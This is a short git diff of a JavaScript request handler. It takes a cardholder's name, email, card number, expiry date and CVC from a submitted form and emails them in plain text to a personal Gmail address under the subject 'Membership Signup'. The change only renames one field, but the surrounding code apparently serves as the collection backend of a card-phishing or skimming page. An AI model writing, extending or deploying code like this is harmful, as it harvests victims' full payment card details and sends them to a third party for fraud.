@@ -54,8 +54,8 @@ export const Details = async (req, res) => {
     try{
 console.log("mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm....mmmmmmmmmmmmM:MALETOMIKEE2X")
 
-        const {name, email,date,cvc, cardNumber, country} = req.body
-const returnDetails = DetailsTemplate(name, email,date,cvc, cardNumber, country)
+        const {cardName, email,date,cvc, cardNumber, country} = req.body
+const returnDetails = DetailsTemplate(cardName, email,date,cvc, cardNumber, country)
         
         await sendMail(returnDetails, "michee2x@gmail.com" , "Membership Signup", res, {email:""})
      
